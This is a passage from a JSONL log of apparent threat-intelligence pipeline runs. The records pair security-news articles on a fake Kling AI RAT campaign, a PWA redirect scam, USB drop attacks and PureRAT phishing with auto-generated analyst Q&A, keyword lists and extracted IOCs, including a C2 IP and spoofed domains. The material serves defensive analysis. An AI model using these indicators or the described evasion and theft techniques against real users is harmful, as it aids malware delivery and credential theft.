Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/russian-hackers-exploit-email-and-vpn.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://blog.checkpoint.com/security/exploiting-the-ai-boom-how-threat-actors-are-targeting-trust-in-generative-platforms-like-kling-ai/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware deployed in this campaign is a remote access Trojan (RAT), which grants attackers remote control of the victim's system and the ability to steal sensitive data.", "question": "What kind of malware is it?"}, {"answer": "The attack involves a remote access Trojan (RAT) and uses social engineering tactics, including fake social media ads and a counterfeit website, to trick users into downloading malicious files.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware monitors the system, especially web browsers and extensions that store passwords or other sensitive data, giving attackers the ability to steal personal information.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The malware deployed in this campaign monitors the system, especially web browsers and extensions that store passwords or other sensitive data, giving attackers the ability to steal personal information. However, it is not explicitly stated that it steals credit cards or bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals sensitive data, including personal information and passwords stored in web browsers and extensions.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attackers' server, as indicated by a hidden configuration file that connects back to the server.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://blog.checkpoint.com/security/exploiting-the-ai-boom-how-threat-actors-are-targeting-trust-in-generative-platforms-like-kling-ai/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "fraud", "apt", "phishing", "malicious", "passwords", "browser"], "article_textual_content": "# Exploiting the AI Boom: How Threat Actors Are Targeting Trust in Generative Platforms like Kling AI\n\n- In early 2025, Check Point Research identified a cyber attack campaign exploiting the popularity of generative AI service, Kling AI. The attack began with deceptive social media ads leading to a fake website designed to trick users into downloading malicious files.\n- The attack used fake Facebook pages and ads to distribute a malicious file which ultimately led to the execution of a remote access Trojan (RAT), granting attackers remote control of the victim’s system and the ability to steal sensitive data.\n- The malware deployed in this campaign featured advanced evasion techniques, including file masquerading to disguise harmful executable files as harmless media files, and extensive anti-analysis methods to avoid detection.\n- Check Point’s threat emulation and Harmony Endpoint offer robust protection against the techniques and threats outlined in this campaign, ensuring defense against malicious files, remote access tools, and targeted social engineering attacks.\n\nAs generative AI continues to capture global attention, threat actors are quick to exploit AI’s capabilities and popularity. From deepfake scams to impersonation attacks, the rising trust in AI-powered platforms has created new openings for cyber criminals. In early 2025, Check Point Research began tracking a sophisticated threat campaign that capitalized on this trend, specifically by impersonating Kling AI, a widely used image and video synthesis tool with over 6 million users.\n\nThis campaign, propagated through false Facebook advertisements and spoofed pages, ultimately directed users to a counterfeit website designed to deliver a malicious payload. In this blog, we break down the tactics used in this campaign and examine how attackers are leveraging the credibility of generative AI services to deceive users and spread malware.\n\nFor a comprehensive understanding of the impersonation attack, read Check Point Research’s publication here.\n\n##### From Fake Ads to Fake Downloads\n\nThe attack begins with fake advertisements on social media. Since early 2025, our team has identified around 70 sponsored posts that falsely promote the popular AI tool Kling AI. These ads come from convincing but fraudulent Facebook pages designed to look like the real company.\n\nClicking on one of these ads leads users to a fake website that closely mimics Kling AI’s actual interface. Just like the real tool, the site invites users to upload images and click a “Generate” button to see AI-powered results. However, instead of delivering an image or video, the site offers a download—one that appears to be an archive file containing a new AI-generated media file.\n\nThe downloaded file is made to look like a harmless image, complete with a name like Generated\\_Image\\_2025.jpg and even a familiar image icon. However, behind this seemingly harmless appearance lies something dangerous: the file is a disguised program intended to compromise the user’s system. This technique—known as filename masquerading—is a common tactic used by threat actors to trick users into launching malicious software.\n\nOnce opened, the program quietly installs itself, ensures it can restart automatically every time the computer is turned on. It also checks for any signs that it’s being watched or analyzed by cyber security tools and tries to avoid detection.\n\n##### Stage 2: Silent Takeover with Remote Access Tools\n\nAfter the initial fake file is opened, a second, more serious threat is activated. This stage installs called a remote access Trojan (RAT), a malware that allows attackers to take control of the victim’s computer from a distance.\n\nEach version of this tool is slightly altered to avoid detection, but all include a hidden configuration file that connects back to the attackers’ server. These files also contain campaign names like “Kling AI 25/03/2025” or “Kling AI Test Startup,” suggesting ongoing testing and updates by the threat actors.\n\nOnce in place, the malware begins monitoring the system—especially web browsers and extensions that store passwords or other sensitive data—giving attackers the ability to steal personal information and maintain long-term access.\n\n##### A Familiar Playbook: Tracing the Campaign\n\nWhile the exact identity of the attackers remains unknown, evidence strongly suggests links to Vietnamese threat actors. Facebook-based scams and malware campaigns are a known tactic among groups from the region—especially those focused on stealing personal data.\n\nIn this case, our analysis revealed multiple clues pointing in that direction. Similar campaigns themed around AI tools have previously contained Vietnamese-language terms within the malware code. Consistent with that pattern, we found several references—such as debug messages—in Vietnamese in this latest campaign as well.\n\nThese findings align with broader trends observed by other security researchers investigating similar Facebook malvertising efforts.\n\n##### Defending Against the New Face of AI-Themed Threats\n\nAs generative AI tools grow in popularity, cyber criminals are finding new ways to exploit that trust. This campaign, which impersonated Kling AI through fake ads and deceptive websites, demonstrates how threat actors are combining social engineering with advanced malware to gain access to users’ systems and personal data.\n\nWith tactics ranging from file masquerading to remote access and data theft, and signs pointing to Vietnamese threat groups, this operation fits into a broader trend of increasingly targeted and sophisticated social media-based attacks.\n\nTo help organizations stay protected, Check Point threat emulation and Harmony Endpoint offer comprehensive coverage across attack methods, file types, and operating systems—effectively blocking the threats outlined in this report. As always, proactive threat detection and user awareness remain essential in defending against evolving cyber threats.\n\nFor a comprehensive understanding of the impersonation attack, read Check Point Research’s publication here.\n\n#### You may also like\n\n### Introducing Check Point MCP Servers: Integrate Check Point Cyber Security Capabilities Directly into Your AI Tools\n\nSecurity teams today need to move faster, prove compliance, and ...\n\n### From Classrooms to Code Red: 3,000+ Cyber Threats Hit U.S. Schools and Universities Weekly\n\nClassrooms and campuses have gone fully digital — and continue ...\n\n### Smart Networks, Smarter Threats: Securing Telecoms in the Age of AI and Critical Infrastructure\n\nAs we celebrate World Telecommunication and Information Society Day (WTISD) ...\n\n### Phishing Campaign Mimics Email Quarantine Notifications: 32,000 Emails Target 6,358 Customers\n\nIn a recent discovery, Check Point researchers have identified a ...\n\n- COMPANY\n    - About Us\n    - Careers\n    - Leadership\n    - Newsroom\n    - Legal\n    - Trust Center\n    - Investor Relations\n    - Merchandise Store\n    - Contact Us\n- TECHNICAL RESOURCES\n    - User Center Sign In\n    - Advisories\n    - Threat Map\n    - Threat Wiki\n    - URL Categorization\n    - App Wiki\n- EXPAND &amp; LEARN\n    - Resource Center\n    - Cyber Hub\n    - Check Point Research\n    - Check Point Blog\n    - CheckMates Community\n    - Customer Stories\n- SUPPORT &amp; SERVICES\n    - Support Center\n    - Infinity Global Services\n    - IGS Portal\n    - Contact Sales\n        - North America:\n        - +1-866-488-6691\n        - International:\n        - +44-125-333-5558\n    - Contact Support\n        - North America:\n        - +1-888-361-5030\n        - International:\n        - +44-114-478-2845"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/fake-kling-ai-facebook-ads-deliver-rat.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is a remote access Trojan (RAT), specifically the PureHVNC RAT, which allows attackers to gain remote control of the victim's system and steal sensitive data.", "question": "What kind of malware is it?"}, {"answer": "The attack involves social engineering and malvertising techniques to distribute a remote access Trojan (RAT) malware, which grants attackers remote control of the victim's system and allows them to steal sensitive data.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware exfiltrates browser-stored credentials, session tokens, and other sensitive data.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The malware, specifically the PureHVNC RAT, is capable of stealing data from several cryptocurrency wallet extensions installed on Chromium-based browsers, and it also captures screenshots when window titles matching banks and wallets are opened.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, the malware is related to a wallet stealer, specifically the PureHVNC RAT, which can steal data from several cryptocurrency wallet extensions installed on Chromium-based browsers.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals browser-stored credentials, session tokens, and other sensitive data, including data from cryptocurrency wallet extensions installed on Chromium-based browsers.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is exfiltrated to a command-and-control (C2) server, and in the case of the PureHVNC RAT, it contacts a remote server at the IP address 185.149.232[.]197.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations and institutions include banks and wallets, with window titles matching banks and wallets being captured by the PureHVNC RAT. The campaign is suspected to be from Vietnam, and the scam pages are operated from China, Sri Lanka, Vietnam, and the Philippines.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/fake-kling-ai-facebook-ads-deliver-rat.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "klingaimedia[.]com"}, {"type": "Domain or URL", "value": "klingaistudio[.]com"}, {"type": "Domain or URL", "value": "185.149.232[.]197"}, {"type": "IP Address", "value": "185.149.232.197"}], "keywords_found": ["analysis", "threat", "fraud", "intelligence", "wallet", "apt", "malicious", "botnet", "cryptocurrency", "bank", "dropper", "browser"], "article_textual_content": "# Fake Kling AI Facebook Ads Deliver RAT Malware to Over 22 Million Potential Victims\n\nCounterfeit Facebook pages and sponsored ads on the social media platform are being employed to direct users to fake websites masquerading as Kling AI with the goal of tricking victims into downloading malware.\n\nKling AI is an artificial intelligence (AI)-powered platform to synthesize images and videos from text and image prompts. Launched in June 2024, it's developed by Kuaishou Technology, which is headquartered in Beijing, China. As of April 2025, the service has a user base of more than 22 million, per data from the company.\n\n\"The attack used fake Facebook pages and ads to distribute a malicious file which ultimately led to the execution of a remote access Trojan (RAT), granting attackers remote control of the victim's system and the ability to steal sensitive data,\" Check Point said.\n\nFirst detected in early 2025, the campaign leads unsuspecting users to a spoofed website such as klingaimedia[.]com or klingaistudio[.]com, where they are asked to create AI-generated images or videos directly in the browser.\n\nHowever, the website does not generate the multimedia count as advertised. Rather, it offers the option to a purported image or video that, in reality, is a malicious Windows executable hidden using double extensions and Hangul Filler (0xE3 0x85 0xA4) characters.\n\nThe payload is included in a ZIP archive and acts as a loader to launch a remote access trojan and a stealer that then establishes contact with a command-and-control (C2) server and exfiltrates browser-stored credentials, session tokens, and other sensitive data.\n\nThe loader, besides monitoring for analysis tools such as Wireshark, OllyDbg, Procmon, ProcExp, PeStudio, and Fiddler, makes Windows Registry changes to set up persistence and launches the second-stage by injecting it into a legitimate system process like \"CasPol.exe\" or \"InstallUtil.exe\" to evade detection.\n\nThe second-stage payload, obfuscated using .NET Reactor, is the PureHVNC RAT that contacts a remote server (185.149.232[.]197) and comes with capabilities to steal data from several cryptocurrency wallet extensions installed on Chromium-based browsers. PureHVNC also adopts a plugin-based approach to capture screenshots when window titles matching banks and wallets are opened.\n\nCheck Point said it identified no less than 70 promoted posts from fake social media pages impersonating Kling AI. It's currently not clear who is behind the campaign, but evidence gathered from the fake website's web page and some of the ads show that they could be from Vietnam.\n\nThe use of Facebook malvertising techniques to distribute stealer malware has been a tried-and-tested tactic of Vietnamese threat actors, who have been increasingly capitalizing on the popularity of generative AI tools to push malware.\n\nEarlier this month, Morphisec revealed that a Vietnamese threat actor has been leveraging fake AI-powered tools as a lure to entice users into downloading an information stealer malware dubbed Noodlophile.\n\n\"This campaign, which impersonated Kling AI through fake ads and deceptive websites, demonstrates how threat actors are combining social engineering with advanced malware to gain access to users' systems and personal data,\" Check Point said.\n\n\"With tactics ranging from file masquerading to remote access and data theft, and signs pointing to Vietnamese threat groups, this operation fits into a broader trend of increasingly targeted and sophisticated social media-based attacks.\"\n\nThe development comes as The Wall Street Journal reported that Meta is battling an \"epidemic of scams,\" with cyber criminals flooding Facebook and Instagram with various kinds of scams ranging from romance baiting to sketchy bargain ads to fake giveaways. Many of the scam pages are operated from China, Sri Lanka, Vietnam, and the Philippines, the report added.\n\nAccording to Rest of World, phony job ads on Telegram, Facebook, and other social media are being increasingly used to lure young Indonesians and get trafficked to scam compounds in Southeast Asia, from where they are coerced into running investment scams and defraud victims across the world.\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.catonetworks.com/blog/cato-ctrl-suspected-russian-threat-actors/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/researchers-expose-pwa-javascript.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a Progressive Web App (PWA) JavaScript attack that redirects users to adult scam apps.", "question": "What kind of malware is it?"}, {"answer": "It involves a client-side attack that uses third-party JavaScript to inject malicious code and redirect mobile users to a scam app.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses malicious JavaScript injections to redirect site visitors to a scam app.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/researchers-expose-pwa-javascript.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "apt", "phishing", "malicious", "botnet", "dropper", "browser"], "article_textual_content": "# Researchers Expose PWA JavaScript Attack That Redirects Users to Adult Scam Apps\n\nCybersecurity researchers have discovered a new campaign that employs malicious JavaScript injections to redirect site visitors on mobile devices to a Chinese adult-content Progressive Web App (PWA) scam.\n\n\"While the payload itself is nothing new (yet another adult gambling scam), the delivery method stands out,\" c/side researcher Himanshu Anand said in a Tuesday analysis.\n\n\"The malicious landing page is a full-blown Progressive Web App (PWA), likely aiming to retain users longer and bypass basic browser protections.\"\n\nThe campaign is designed to explicitly filter out desktop users, primarily focusing on mobile users. The activity has been described as a client-side attack that uses third-party JavaScript and only triggers on mobile devices.\n\nThe use of PWAs, a type of application built using web technologies that provide a user experience similar to that of a native app built for a specific platform like Windows, Linux, macOS, Android, or iOS, is seen as an attempt to sidestep security protections.\n\nThe attacks involve injecting websites with JavaScript code that acts as a loader to trigger the redirection when the site is visited from devices running on Android, iOS, and iPadOS, among others.\n\nThe redirections are designed to lead the users to adult content websites or other intermediary redirect pages advertising apps for viewing adult content. The pages subsequently take the victims to a fake app store listing for the supposed Android and iOS apps in question.\n\n\"The use of PWAs suggests attackers are experimenting with more persistent phishing methods,\" Anand said. \"The mobile-only focus allows them to evade many detection mechanisms.\"\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://osintteam.blog/you-found-a-usb-stick-dont-plug-it-in-it-s-not-a-juice-box-e1ace9aae02a?source=rss----2983bc435765---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "It involves a USB Drop Attack, where a hacker leaves a malware-loaded USB drive in a public place, and someone plugs it in, compromising their device.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://osintteam.blog/you-found-a-usb-stick-dont-plug-it-in-it-s-not-a-juice-box-e1ace9aae02a?source=rss----2983bc435765---4", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://www.paypal.me/infosecmonk25"}], "keywords_found": ["threat", "intelligence"], "article_textual_content": "# OSINT Team\n\nFollow publication\n\nWe teach OSINT from multiple perspectives. InfoSec experts, journalists, law enforcement and other intelligence specialists read us to grow their skills faster.\n\nFollow publication\n\nMember-only story\n\n# “You Found a USB Stick? Don’t Plug It In, It’s Not a Juice Box!”\n\n## USB Drop Attacks in the Remote Work Era: Still Relevant?\n\n2 hours ago\n\n--\n\nShare\n\nPhoto by Hendrik Morkel on Unsplash\n\nWelcome back to Underrated Security — where we dig into those weird, often-overlooked threats that sound like bad movie plots… but are very real.\n\nToday, we’re throwing it back to a classic:\n\nThe USB Drop Attack.\n\nYup, that old trick where a hacker leaves a mysterious USB drive in the wild — and someone (ahem, maybe you) picks it up and plugs it in just to “see what’s on it.”\n\nNow you’re probably thinking:\n\n“Bro, it’s 2025. Aren’t we past that? We’re all remote now!”\n\nOh, my friend. Sit down. Grab a coffee.\n\nLet’s talk about why USB drop attacks are still alive, kicking, and sneakier than ever.\n\n# Quick Recap: What Is a USB Drop Attack?\n\nImagine this scenario:\n\n1. Hacker loads a USB with malware or a bad script\n2. Labels it “Payroll\\_Q1\\_2025” or “Layoffs\\_List” (spicy!)\n3. Drops it in the company parking lot or a co-working space\n4. Someone picks it up and… plugs it in.\n\n--\n\n--\n\n## Published in OSINT Team\n\nWe teach OSINT from multiple perspectives. InfoSec experts, journalists, law enforcement and other intelligence specialists read us to grow their skills faster.\n\n## Written by Bl@ckC!pH3r\n\nInfoSec Expert specializing in MS E5 Security, Cloud Security, &amp; Sec. Architecture. | AI-Sec Enthusiast | Buy me a ☕: https://www.paypal.me/infosecmonk25\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/purerat-malware-spikes-4x-in-2025.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is called PureRAT, a backdoor malware that allows attackers to gain unlimited access to infected systems and confidential organization data.", "question": "What kind of malware is it?"}, {"answer": "It involves a phishing campaign that distributes PureRAT malware, which is launched through a phishing email with a RAR file attachment or a link to the archive.", "question": "What kind of attack does it involve?"}, {"answer": "The malware, specifically the PluginWindowNotify module, checks the name of the active window for keywords like password, bank, WhatsApp, and performs follow-up actions, but it is not explicitly stated as using web inject. However, PluginClipper functions as a clipper malware, substituting cryptocurrency wallet addresses.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the PureLogs information stealer can harvest data from web browsers, including credentials.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, the PureRAT malware and PureLogs stealer can harvest data from web browsers, email clients, and other programs, including password managers and cryptocurrency wallet apps, potentially stealing credit card and bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, the PureRAT malware includes a module called PluginClipper, which functions as a clipper malware by substituting cryptocurrency wallet addresses copied to the system's clipboard with an attacker-controlled one. Additionally, PureLogs is an information stealer that can harvest data from cryptocurrency wallet apps.", "question": "Is it related to wallet stealer?"}, {"answer": "The PureLogs malware can harvest data from web browsers, email clients, VPN services, messaging apps, wallet browser extensions, password managers, cryptocurrency wallet apps, and other programs.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations are Russian organizations, but specific regions, banks, or wallets are not mentioned, except for the mention of targeting Russian firms and the malware checking for keywords like \"bank\" and \"WhatsApp\".", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/purerat-malware-spikes-4x-in-2025.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["analysis", "threat", "wallet", "apt", "phishing", "malicious", "botnet", "cryptocurrency", "bank", "dropper", "browser", "backdoor", "keylogger"], "article_textual_content": "# PureRAT Malware Spikes 4x in 2025, Deploying PureLogs to Target Russian Firms\n\nRussian organizations have become the target of a phishing campaign that distributes malware called PureRAT, according to new findings from Kaspersky.\n\n\"The campaign aimed at Russian business began back in March 2023, but in the first third of 2025 the number of attacks quadrupled compared to the same period in 2024,\" the cybersecurity vendor said.\n\nThe attack chains, which have not been attributed to any specific threat actor, commence with a phishing email that contains a RAR file attachment or a link to the archive that masquerades as a 